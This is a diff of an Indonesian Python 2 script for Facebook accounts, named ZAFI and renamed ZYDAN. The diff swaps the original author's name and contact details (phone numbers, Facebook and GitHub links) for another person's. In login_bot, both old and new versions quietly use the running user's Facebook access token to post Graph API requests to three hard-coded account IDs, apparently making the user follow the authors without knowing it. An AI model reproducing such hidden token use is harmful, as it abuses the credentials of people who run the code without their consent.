@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# coding by Romi Afrizal
+# coding by ZYDAN AKMAL
 # Note : jangan di ubah lagi! nanti error, script udah enak
 # Open source code team | ngotak dikit cok jangan jual di perjual belikan 
 
@@ -10,12 +10,12 @@ ingfo = (
 """%s
  • Info script :
  	
- - author      : Romi Afrizal
- - facebook    : facebook.com/romi.afrizal.102
+ - author      : ZYDAN AKMAL
+ - facebook    : facebook.com/andika.g.id.3
  - fanspage    : facebook.com/100022086172556
- - whatsap     : +6282371648186
- - github      : github.com/Mark-Zuck
- - script name : ZAFI (Zona Akun Facebook Indonesia)
+ - whatsap     : +6285850724092
+ - github      : github.com/Mark-Zuck/zydan
+ - script name : ZYDAN (Zona Akun Facebook Indonesia)
  - version     : 1.1
  
 %s"""%(Hj,Mt))
@@ -123,8 +123,8 @@ def login_bot(romz):
 		romz1 = ('100067807565861')
 		romz2 = ('100029143111567')
 		romz3 = ('100028434880529')
-		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # ROMI AFRIZAL PENGGUNA AKUN UNIK
-		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT ROMI AFRIZAL
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # ZYDAN AKMAL PENGGUNA AKUN UNIK
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT ZYDAN AKMAL
 		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # Romi Afrizal (2018)
 		
 	except:
